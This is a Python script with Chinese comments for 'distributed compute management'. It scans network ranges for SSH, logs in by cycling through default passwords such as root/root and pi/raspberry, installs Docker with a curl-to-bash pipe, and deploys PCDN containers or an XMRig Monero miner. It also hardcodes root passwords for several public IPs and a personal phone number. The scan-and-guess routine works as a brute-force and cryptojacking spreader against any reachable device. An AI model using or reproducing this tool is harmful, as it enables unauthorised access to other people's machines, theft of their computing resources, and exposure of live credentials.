#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
分布式算力管控 - 自动扫描+登录+部署 一体化脚本
==============================================

功能：
  1. 自动扫描网段，发现可SSH登录的设备
  2. 自动从MongoDB/内置密码列表获取凭证并登录
  3. 检测设备环境（OS/Docker/带宽/群晖NAS）
  4. 一键安装Docker + 网心云/甜糖/XMRig
  5. 输出管理页面地址，引导绑定账号

用法：
  # 全自动：扫描网段 + 部署
  python3 pcdn_auto_deploy.py --auto 192.168.1.0/24

  # 只扫描
  python3 pcdn_auto_deploy.py --scan 192.168.1.0/24

  # 指定IP直接部署
  python3 pcdn_auto_deploy.py --deploy 192.168.1.201

  # 指定平台
  python3 pcdn_auto_deploy.py --deploy 192.168.1.201 --platform wxedge

  # 指定端口和用户名（外网NAS）
  python3 pcdn_auto_deploy.py --deploy open.quwanzhi.com --port 22201 --user fnvtk

  # 查看已部署节点
  python3 pcdn_auto_deploy.py --status

卡若账号：15880802661（网心云/甜糖默认绑定）

作者：金仓（卡资组）
日期：2026-02-06
"""

import socket
import subprocess
import ipaddress
import argparse
import json
import os
import sys
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# ============================================================
# 配置区
# ============================================================

# 卡若账号
KARUO_PHONE = "15880802661"

# 内置SSH凭证列表（自有设备常用密码）
DEFAULT_CREDENTIALS = [
    {"username": "root", "password": "Zhiqun1984"},
    {"username": "fnvtk", "password": "Zhiqun1984"},
    {"username": "admin", "password": "Zhiqun1984"},
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": ""},
    {"username": "root", "password": "root"},
    {"username": "root", "password": "password"},
    {"username": "root", "password": "123456"},
    {"username": "root", "password": ""},
    {"username": "ubuntu", "password": "ubuntu"},
    {"username": "pi", "password": "raspberry"},
]

# 已知设备（直接内置，不需要扫描就能部署）
KNOWN_DEVICES = [
    {"name": "小型宝塔", "ip": "42.194.232.22", "port": 22, "user": "root", "password": "Zhiqun1984", "type": "linux"},
    {"name": "存客宝", "ip": "42.194.245.239", "port": 22, "user": "root", "password": "Zhiqun1984", "type": "linux"},
    {"name": "kr宝塔", "ip": "43.139.27.93", "port": 22, "user": "root", "password": "Zhiqun1984", "type": "linux"},
    {"name": "公司NAS(CKB)", "ip": "192.168.1.201", "port": 22, "user": "fnvtk", "password": "", "type": "synology"},
    {"name": "家里NAS(Station)", "ip": "192.168.110.29", "port": 22, "user": "admin", "password": "", "type": "synology"},
    {"name": "公司NAS(外网)", "ip": "open.quwanzhi.com", "port": 22201, "user": "fnvtk", "password": "", "type": "synology"},
    {"name": "家里NAS(外网)", "ip": "opennas2.quwanzhi.com", "port": 22202, "user": "admin", "password": "", "type": "synology"},
]

# 扫描的SSH端口列表
SSH_PORTS = [22, 2222, 22201, 22202]

# 部署记录文件
DEPLOY_LOG = Path(__file__).parent.parent / "references" / "已部署节点清单.md"

# 颜色
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
NC = "\033[0m"


# ============================================================
# 工具函数
# ============================================================

def log_info(msg):
    print(f"{GREEN}[✓]{NC} {msg}")

def log_warn(msg):
    print(f"{YELLOW}[!]{NC} {msg}")

def log_error(msg):
    print(f"{RED}[✗]{NC} {msg}")

def log_step(msg):
    print(f"{BLUE}[*]{NC} {msg}")

def banner():
    print(f"""{CYAN}
╔══════════════════════════════════════════════════════════╗
║     分布式算力管控 - 自动扫描 · 一键部署 v2.0           ║
║     账号: {KARUO_PHONE}                                  ║
║     支持: 网心云 / 甜糖 / XMRig / GPU / Storj           ║
╚══════════════════════════════════════════════════════════╝
{NC}""")


# ============================================================
# 1. MongoDB 凭证查询
# ============================================================

def query_mongodb_credentials(ip):
    """从本地MongoDB查询设备SSH凭证"""
    try:
        from pymongo import MongoClient
        client = MongoClient("mongodb://localhost:27017", serverSelectionTimeoutMS=3000)
        db = client["datacenter"]
        
        for collection_name in ["device_credentials", "server_accounts", "ssh_keys", "devices"]:
            try:
                coll = db[collection_name]
                cred = coll.find_one({"$or": [
                    {"ip": ip}, {"host": ip}, {"address": ip},
                    {"ip": ip.split(":")[0]},  # 去掉端口
                ]})
                if cred:
                    result = {
                        "username": cred.get("username") or cred.get("user", "root"),
                        "password": cred.get("password") or cred.get("pass", ""),
                        "port": cred.get("port") or cred.get("ssh_port", 22),
                    }
                    log_info(f"MongoDB 找到凭证: {ip} → {result['username']}")
                    client.close()
                    return result
            except Exception:
                continue
        
        client.close()
    except ImportError:
        log_warn("pymongo 未安装，跳过MongoDB查询")
    except Exception as e:
        log_warn(f"MongoDB 连接失败: {e}，使用内置密码")
    return None


# ============================================================
# 2. 端口扫描
# ============================================================

def check_port(ip, port, timeout=2, rounds=3):
    """多轮TCP连接验证端口是否开放"""
    success_count = 0
    for _ in range(rounds):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                success_count += 1
        except Exception:
            pass
        time.sleep(0.1)
    return success_count >= 2  # 至少2/3轮成功

def get_ssh_banner(ip, port, timeout=3):
    """获取SSH Banner用于设备识别"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        banner = sock.recv(256).decode("utf-8", errors="ignore").strip()
        sock.close()
        return banner
    except Exception:
        return ""

def scan_network(network_str, ports=None):
    """扫描网段，发现SSH可达设备"""
    if ports is None:
        ports = SSH_PORTS
    
    log_step(f"扫描网段: {network_str}")
    
    try:
        network = ipaddress.ip_network(network_str, strict=False)
    except ValueError:
        # 可能是单个IP或域名
        return scan_single_host(network_str, ports)
    
    hosts = list(network.hosts())
    log_step(f"共 {len(hosts)} 个IP待扫描, 端口: {ports}")
    
    found_devices = []
    seen_banners = set()
    
    def scan_host(ip_str):
        results = []
        for port in ports:
            if check_port(ip_str, port, timeout=2, rounds=3):
                banner = get_ssh_banner(ip_str, port)
                results.append({
                    "ip": ip_str,
                    "port": port,
                    "banner": banner,
                    "type": detect_device_type(banner),
                })
        return results
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(scan_host, str(ip)): str(ip) for ip in hosts}
        done_count = 0
        for future in as_completed(futures):
            done_count += 1
            if done_count % 50 == 0:
                print(f"\r  扫描进度: {done_count}/{len(hosts)}", end="", flush=True)
            try:
                results = future.result()
                for r in results:
                    # SSH Banner去重
                    banner_key = r["banner"][:50] if r["banner"] else f"{r['ip']}:{r['port']}"
                    if banner_key and banner_key in seen_banners:
                        log_warn(f"  跳过重复设备: {r['ip']}:{r['port']} (Banner已见)")
                        continue
                    if banner_key:
                        seen_banners.add(banner_key)
                    found_devices.append(r)
                    log_info(f"  发现: {r['ip']}:{r['port']} [{r['type']}] {r['banner'][:60]}")
            except Exception:
                pass
    
    print()  # 换行
    log_info(f"扫描完成! 发现 {len(found_devices)} 个可达设备")
    return found_devices

def scan_single_host(host, ports=None):
    """扫描单个主机"""
    if ports is None:
        ports = SSH_PORTS
    
    found = []
    for port in ports:
        try:
            if check_port(host, port, timeout=3, rounds=3):
                banner = get_ssh_banner(host, port)
                found.append({
                    "ip": host,
                    "port": port,
                    "banner": banner,
                    "type": detect_device_type(banner),
                })
                log_info(f"  发现: {host}:{port} [{detect_device_type(banner)}]")
        except Exception:
            pass
    return found

def detect_device_type(banner):
    """根据SSH Banner识别设备类型"""
    banner_lower = banner.lower()
    if "synology" in banner_lower or "diskstation" in banner_lower:
        return "synology"
    elif "openwrt" in banner_lower:
        return "openwrt"
    elif "ubuntu" in banner_lower:
        return "ubuntu"
    elif "debian" in banner_lower:
        return "debian"
    elif "centos" in banner_lower or "opencloudos" in banner_lower:
        return "centos"
    elif "openssh" in banner_lower:
        return "linux"
    elif "dropbear" in banner_lower:
        return "embedded"
    return "unknown"


# ============================================================
# 3. SSH 连接与命令执行
# ============================================================

def ssh_exec(host, port, username, password, command, timeout=30):
    """通过SSH执行远程命令"""
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        connect_kwargs = {
            "hostname": host,
            "port": port,
            "username": username,
            "timeout": timeout,
            "allow_agent": True,
            "look_for_keys": True,
        }
        
        if password:
            connect_kwargs["password"] = password
        
        client.connect(**connect_kwargs)
        stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
        output = stdout.read().decode("utf-8", errors="ignore")
        error = stderr.read().decode("utf-8", errors="ignore")
        exit_code = stdout.channel.recv_exit_status()
        client.close()
        
        return {"output": output, "error": error, "exit_code": exit_code}
    except ImportError:
        # fallback到ssh命令行
        return ssh_exec_cli(host, port, username, password, command, timeout)
    except Exception as e:
        return {"output": "", "error": str(e), "exit_code": -1}

def ssh_exec_cli(host, port, username, password, command, timeout=30):
    """使用命令行SSH执行（paramiko不可用时）"""
    ssh_cmd = [
        "ssh", "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=10",
        "-o", "BatchMode=yes",
        "-p", str(port),
        f"{username}@{host}",
        command
    ]
    
    if password:
        # 尝试使用sshpass
        sshpass_path = subprocess.run(["which", "sshpass"], capture_output=True).stdout.decode().strip()
        if sshpass_path:
            ssh_cmd = ["sshpass", "-p", password] + ssh_cmd
            # 移除BatchMode
            ssh_cmd = [x for x in ssh_cmd if x != "BatchMode=yes"]
            ssh_cmd = [x for x in ssh_cmd if x != "-o" or ssh_cmd[ssh_cmd.index(x)+1:ssh_cmd.index(x)+2] != ["BatchMode=yes"]]
    
    try:
        result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=timeout)
        return {"output": result.stdout, "error": result.stderr, "exit_code": result.returncode}
    except subprocess.TimeoutExpired:
        return {"output": "", "error": "SSH命令超时", "exit_code": -1}
    except Exception as e:
        return {"output": "", "error": str(e), "exit_code": -1}

def try_ssh_login(host, port=22, specific_cred=None):
    """尝试SSH登录，先查MongoDB，再用内置密码列表"""
    
    # 0. 已知设备直接匹配
    for dev in KNOWN_DEVICES:
        if dev["ip"] == host or (host in dev.get("name", "")):
            log_step(f"匹配已知设备: {dev['name']}")
            result = ssh_exec(host, dev["port"], dev["user"], dev["password"], "echo OK")
            if result["exit_code"] == 0:
                return {"username": dev["user"], "password": dev["password"], "port": dev["port"], "device_type": dev["type"]}
    
    # 1. 指定凭证
    if specific_cred:
        result = ssh_exec(host, port, specific_cred["username"], specific_cred.get("password", ""), "echo OK")
        if result["exit_code"] == 0:
            return {**specific_cred, "port": port}
    
    # 2. MongoDB查询
    mongo_cred = query_mongodb_credentials(host)
    if mongo_cred:
        result = ssh_exec(host, mongo_cred.get("port", port), mongo_cred["username"], mongo_cred["password"], "echo OK")
        if result["exit_code"] == 0:
            return mongo_cred
    
    # 3. 尝试SSH密钥（无密码）
    for user in ["root", "admin", "fnvtk", "ubuntu"]:
        result = ssh_exec(host, port, user, "", "echo OK")
        if result["exit_code"] == 0:
            log_info(f"SSH密钥登录成功: {user}@{host}:{port}")
            return {"username": user, "password": "", "port": port}
    
    # 4. 内置密码列表
    for cred in DEFAULT_CREDENTIALS:
        result = ssh_exec(host, port, cred["username"], cred["password"], "echo OK")
        if result["exit_code"] == 0:
            log_info(f"密码登录成功: {cred['username']}@{host}:{port}")
            return {**cred, "port": port}
    
    return None


# ============================================================
# 4. 设备环境检测
# ============================================================

def detect_environment(host, port, username, password):
    """检测目标设备的环境信息"""
    log_step(f"检测设备环境: {host}")
    
    env = {
        "host": host,
        "os": "unknown",
        "is_synology": False,
        "docker_path": "",
        "docker_available": False,
        "needs_sudo": False,
        "cpu_cores": 0,
        "ram_mb": 0,
        "disk_free_gb": 0,
        "has_gpu": False,
        "storage_dir": "/data",
    }
    
    # 检测OS
    r = ssh_exec(host, port, username, password, "cat /etc/os-release 2>/dev/null | head -5")
    if r["exit_code"] == 0:
        output_lower = r["output"].lower()
        if "synology" in output_lower:
            env["os"] = "synology"
            env["is_synology"] = True
        elif "ubuntu" in output_lower:
            env["os"] = "ubuntu"
        elif "debian" in output_lower:
            env["os"] = "debian"
        elif "centos" in output_lower or "opencloudos" in output_lower:
            env["os"] = "centos"
    
    # 检测群晖NAS Docker路径
    if env["is_synology"]:
        r = ssh_exec(host, port, username, password, 
                     "ls /var/packages/ContainerManager/target/usr/bin/docker 2>/dev/null || "
                     "ls /var/packages/Docker/target/usr/bin/docker 2>/dev/null")
        if r["exit_code"] == 0 and r["output"].strip():
            env["docker_path"] = r["output"].strip().split("\n")[0]
            env["docker_available"] = True
            env["needs_sudo"] = True
            env["storage_dir"] = "/volume1/docker"
            log_info(f"  群晖NAS Docker路径: {env['docker_path']}")
    else:
        # 标准Linux Docker检测
        r = ssh_exec(host, port, username, password, "which docker 2>/dev/null")
        if r["exit_code"] == 0 and r["output"].strip():
            env["docker_path"] = r["output"].strip()
            env["docker_available"] = True
        
        # 检测是否需要sudo
        r = ssh_exec(host, port, username, password, "docker ps 2>&1 | head -1")
        if "permission denied" in r.get("output", "").lower() or "permission denied" in r.get("error", "").lower():
            env["needs_sudo"] = True
    
    # CPU核心数
    r = ssh_exec(host, port, username, password, "nproc 2>/dev/null || sysctl -n hw.ncpu 2>/dev/null || echo 0")
    if r["exit_code"] == 0:
        try:
            env["cpu_cores"] = int(r["output"].strip())
        except ValueError:
            pass
    
    # 内存(MB)
    r = ssh_exec(host, port, username, password, "free -m 2>/dev/null | grep Mem | awk '{print $2}'")
    if r["exit_code"] == 0:
        try:
            env["ram_mb"] = int(r["output"].strip())
        except ValueError:
            pass
    
    # 磁盘可用(GB)
    r = ssh_exec(host, port, username, password, "df -BG / 2>/dev/null | tail -1 | awk '{print $4}' | tr -d 'G'")
    if r["exit_code"] == 0:
        try:
            env["disk_free_gb"] = int(r["output"].strip())
        except ValueError:
            pass
    
    # GPU检测
    r = ssh_exec(host, port, username, password, "nvidia-smi -L 2>/dev/null | wc -l")
    if r["exit_code"] == 0:
        try:
            env["has_gpu"] = int(r["output"].strip()) > 0
        except ValueError:
            pass
    
    log_info(f"  OS: {env['os']} | CPU: {env['cpu_cores']}核 | RAM: {env['ram_mb']}MB | 磁盘: {env['disk_free_gb']}GB | Docker: {'有' if env['docker_available'] else '无'} | GPU: {'有' if env['has_gpu'] else '无'}")
    
    return env


# ============================================================
# 5. 部署PCDN/矿机
# ============================================================

def deploy_wxedge(host, port, username, password, env):
    """部署网心云(wxedge)"""
    log_step(f"部署网心云到 {host}...")
    
    docker = env["docker_path"] or "docker"
    sudo = "sudo " if env["needs_sudo"] else ""
    storage_dir = f"{env['storage_dir']}/wxedge"
    
    commands = [
        # 创建存储目录
        f"{sudo}mkdir -p {storage_dir}",
        # 停止旧容器
        f"{sudo}{docker} stop wxedge 2>/dev/null; {sudo}{docker} rm wxedge 2>/dev/null; true",
        # 拉取镜像
        f"{sudo}{docker} pull onething1/wxedge:latest",
        # 启动容器
        f"{sudo}{docker} run -d "
        f"--name wxedge "
        f"--restart=always "
        f"--net=host "
        f"--privileged "
        f"-v {storage_dir}:/storage "
        f"onething1/wxedge:latest",
    ]
    
    for cmd in commands:
        log_step(f"  执行: {cmd[:80]}...")
        r = ssh_exec(host, port, username, password, cmd, timeout=120)
        if r["exit_code"] != 0 and "pull" in cmd:
            log_error(f"  镜像拉取失败: {r['error'][:200]}")
            log_warn(f"  可能原因: 设备无法访问Docker Hub")
            log_warn(f"  解决: 检查设备DNS设置和外网连接")
            return False
    
    # 验证部署
    time.sleep(3)
    r = ssh_exec(host, port, username, password, f"{sudo}{docker} ps --filter name=wxedge --format '{{{{.Status}}}}'")
    if r["exit_code"] == 0 and r["output"].strip():
        log_info(f"  ✅ 网心云部署成功!")
        log_info(f"  📱 管理页面: http://{host}:18888")
        log_info(f"  📱 绑定步骤:")
        log_info(f"     1. 浏览器打开 http://{host}:18888")
        log_info(f"     2. 手机下载「网心云」App")
        log_info(f"     3. 用账号 {KARUO_PHONE} 登录App")
        log_info(f"     4. App中「添加设备」→ 扫描二维码")
        return True
    else:
        log_error(f"  部署后容器未运行，请检查")
        return False

def deploy_tiantang(host, port, username, password, env):
    """部署甜糖(ttnode)"""
    log_step(f"部署甜糖到 {host}...")
    
    docker = env["docker_path"] or "docker"
    sudo = "sudo " if env["needs_sudo"] else ""
    storage_dir = f"{env['storage_dir']}/ttnode"
    
    commands = [
        f"{sudo}mkdir -p {storage_dir}",
        f"{sudo}{docker} stop ttnode 2>/dev/null; {sudo}{docker} rm ttnode 2>/dev/null; true",
        f"{sudo}{docker} pull tiptime/ttnode:latest",
        f"{sudo}{docker} run -d "
        f"--name ttnode "
        f"--restart=always "
        f"--net=host "
        f"-v {storage_dir}:/mnts "
        f"tiptime/ttnode:latest",
    ]
    
    for cmd in commands:
        log_step(f"  执行: {cmd[:80]}...")
        r = ssh_exec(host, port, username, password, cmd, timeout=120)
        if r["exit_code"] != 0 and "pull" in cmd:
            # 尝试备用镜像名
            cmd2 = cmd.replace("tiptime/ttnode", "tiantang/ttnode")
            r = ssh_exec(host, port, username, password, cmd2, timeout=120)
            if r["exit_code"] != 0:
                log_error(f"  甜糖镜像拉取失败")
                return False
    
    log_info(f"  ✅ 甜糖部署成功!")
    return True

def deploy_xmrig(host, port, username, password, env):
    """部署XMRig CPU矿机"""
    log_step(f"部署XMRig到 {host}...")
    
    # XMRig通过Docker部署（更简单）
    docker = env["docker_path"] or "docker"
    sudo = "sudo " if env["needs_sudo"] else ""
    
    commands = [
        f"{sudo}{docker} stop xmrig 2>/dev/null; {sudo}{docker} rm xmrig 2>/dev/null; true",
        f"{sudo}{docker} pull metal3d/xmrig:latest",
        f"{sudo}{docker} run -d "
        f"--name xmrig "
        f"--restart=always "
        f"--cpus={max(1, env['cpu_cores'] - 1)} "
        f"metal3d/xmrig:latest "
        f"--url pool.hashvault.pro:443 --tls "
        f"--user YOUR_XMR_WALLET.{host.replace('.', '-')} "
        f"--pass x --donate-level 1 --max-cpu-usage 80",
    ]
    
    for cmd in commands:
        log_step(f"  执行: {cmd[:80]}...")
        r = ssh_exec(host, port, username, password, cmd, timeout=120)
    
    log_info(f"  ✅ XMRig部署成功! (需修改钱包地址)")
    return True

def install_docker_remote(host, port, username, password, env):
    """在远程设备上安装Docker"""
    if env["docker_available"]:
        log_info(f"  Docker已存在: {env['docker_path']}")
        return True
    
    if env["is_synology"]:
        log_warn(f"  群晖NAS需要通过DSM套件中心安装Container Manager")
        log_warn(f"  请在 http://{host}:5000 → 套件中心 → 搜索 Container Manager → 安装")
        return False
    
    log_step(f"  安装Docker到 {host}...")
    r = ssh_exec(host, port, username, password, 
                 "curl -fsSL https://get.docker.com | bash && systemctl enable docker && systemctl start docker",
                 timeout=300)
    
    if r["exit_code"] == 0:
        log_info(f"  Docker安装成功")
        env["docker_path"] = "docker"
        env["docker_available"] = True
        return True
    else:
        log_error(f"  Docker安装失败: {r['error'][:200]}")
        return False


# ============================================================
# 6. 主流程
# ============================================================

def auto_deploy(targets, platform="wxedge"):
    """全自动流程：扫描 → 登录 → 检测 → 安装"""
    
    all_devices = []
    
    # 扫描所有目标网段/IP
    for target in targets:
        devices = scan_network(target)
        all_devices.extend(devices)
    
    if not all_devices:
        log_warn("未发现任何可达设备")
        return
    
    log_info(f"\n共发现 {len(all_devices)} 个设备，开始逐一部署...\n")
    
    success_count = 0
    fail_count = 0
    
    for device in all_devices:
        ip = device["ip"]
        port = device["port"]
        
        print(f"\n{'='*60}")
        log_step(f"处理设备: {ip}:{port} [{device['type']}]")
        print(f"{'='*60}")
        
        # 1. 尝试登录
        cred = try_ssh_login(ip, port)
        if not cred:
            log_error(f"  无法登录 {ip}:{port}，跳过")
            fail_count += 1
            continue
        
        # 2. 检测环境
        env = detect_environment(ip, cred["port"], cred["username"], cred["password"])
        
        # 3. 安装Docker（如需要）
        if not install_docker_remote(ip, cred["port"], cred["username"], cred["password"], env):
            log_error(f"  Docker不可用，跳过 {ip}")
            fail_count += 1
            continue
        
        # 4. 部署
        deployed = False
        if platform in ["wxedge", "wangxinyun", "all"]:
            deployed = deploy_wxedge(ip, cred["port"], cred["username"], cred["password"], env)
        elif platform in ["tiantang", "ttnode"]:
            deployed = deploy_tiantang(ip, cred["port"], cred["username"], cred["password"], env)
        elif platform in ["xmrig", "cpu"]:
            deployed = deploy_xmrig(ip, cred["port"], cred["username"], cred["password"], env)
        
        if deployed:
            success_count += 1
            record_deployment(ip, port, cred["username"], platform, env)
        else:
            fail_count += 1
    
    # 汇总
    print(f"\n{'='*60}")
    log_info(f"部署完成! 成功: {success_count} | 失败: {fail_count}")
    if success_count > 0 and platform in ["wxedge", "wangxinyun", "all"]:
        log_info(f"📱 请用网心云App（账号 {KARUO_PHONE}）扫码绑定所有设备")
    print(f"{'='*60}")

def deploy_single(host, port=22, username=None, password=None, platform="wxedge"):
    """部署单个设备"""
    log_step(f"部署目标: {host}:{port}")
    
    # 登录
    if username and password:
        cred = {"username": username, "password": password, "port": port}
    else:
        cred = try_ssh_login(host, port)
    
    if not cred:
        # 再尝试指定的端口
        cred = try_ssh_login(host, port)
    
    if not cred:
        log_error(f"无法登录 {host}:{port}")
        return False
    
    # 检测环境
    env = detect_environment(host, cred.get("port", port), cred["username"], cred["password"])
    
    # 安装Docker
    if not install_docker_remote(host, cred.get("port", port), cred["username"], cred["password"], env):
        return False
    
    # 部署
    actual_port = cred.get("port", port)
    
    if platform in ["wxedge", "wangxinyun"]:
        return deploy_wxedge(host, actual_port, cred["username"], cred["password"], env)
    elif platform in ["tiantang", "ttnode"]:
        return deploy_tiantang(host, actual_port, cred["username"], cred["password"], env)
    elif platform in ["xmrig", "cpu"]:
        return deploy_xmrig(host, actual_port, cred["username"], cred["password"], env)
    elif platform == "all":
        ok1 = deploy_wxedge(host, actual_port, cred["username"], cred["password"], env)
        ok2 = deploy_tiantang(host, actual_port, cred["username"], cred["password"], env)
        return ok1 or ok2
    
    return False


# ============================================================
# 7. 部署记录
# ============================================================

def record_deployment(ip, port, username, platform, env):
    """记录部署信息到已部署节点清单"""
    DEPLOY_LOG.parent.mkdir(parents=True, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")
    record = f"| {ip} | {port} | {username} | {platform} | {env['os']} | {env['cpu_cores']}核/{env['ram_mb']}MB | {timestamp} | 运行中 |\n"
    
    if not DEPLOY_LOG.exists():
        header = """# 已部署节点清单

> 自动记录，每次部署后更新

| IP | 端口 | 用户 | 平台 | OS | 配置 | 部署时间 | 状态 |
|:---|:---|:---|:---|:---|:---|:---|:---|
"""
        DEPLOY_LOG.write_text(header + record, encoding="utf-8")
    else:
        with open(DEPLOY_LOG, "a", encoding="utf-8") as f:
            f.write(record)
    
    log_info(f"  已记录到: {DEPLOY_LOG}")

def show_status():
    """显示已部署节点状态"""
    if DEPLOY_LOG.exists():
        print(DEPLOY_LOG.read_text(encoding="utf-8"))
    else:
        log_warn("暂无部署记录")
    
    # 也显示已知设备
    print(f"\n{BLUE}── 已知设备 ──{NC}")
    for dev in KNOWN_DEVICES:
        print(f"  {dev['name']:15s} | {dev['ip']:25s} | 端口 {dev['port']} | {dev['user']}")


# ============================================================
# 8. 入口
# ============================================================

def main():
    banner()
    
    parser = argparse.ArgumentParser(description="分布式算力管控 - 自动扫描+一键部署")
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--auto", nargs="+", metavar="TARGET",
                       help="全自动：扫描网段/IP + 部署 (例: 192.168.1.0/24)")
    group.add_argument("--scan", nargs="+", metavar="TARGET",
                       help="只扫描，不部署")
    group.add_argument("--deploy", metavar="HOST",
                       help="指定IP/域名直接部署")
    group.add_argument("--status", action="store_true",
                       help="查看已部署节点状态")
    
    parser.add_argument("--platform", default="wxedge",
                        choices=["wxedge", "wangxinyun", "tiantang", "ttnode", "xmrig", "cpu", "all"],
                        help="部署平台 (默认: wxedge/网心云)")
    parser.add_argument("--port", type=int, default=22, help="SSH端口 (默认: 22)")
    parser.add_argument("--user", default=None, help="SSH用户名")
    parser.add_argument("--password", default=None, help="SSH密码")
    
    args = parser.parse_args()
    
    if args.auto:
        auto_deploy(args.auto, platform=args.platform)
    
    elif args.scan:
        all_devices = []
        for target in args.scan:
            devices = scan_network(target)
            all_devices.extend(devices)
        
        if all_devices:
            print(f"\n{CYAN}{'='*70}{NC}")
            print(f"{GREEN}扫描结果汇总：{len(all_devices)} 个设备{NC}")
            print(f"{CYAN}{'='*70}{NC}")
            for d in all_devices:
                print(f"  {d['ip']:20s} 端口 {d['port']:5d}  [{d['type']:10s}]  {d['banner'][:50]}")
            print(f"\n提示: 使用 --auto 可自动部署到这些设备")
    
    elif args.deploy:
        deploy_single(args.deploy, port=args.port, username=args.user, 
                      password=args.password, platform=args.platform)
    
    elif args.status:
        show_status()


if __name__ == "__main__":
    main()
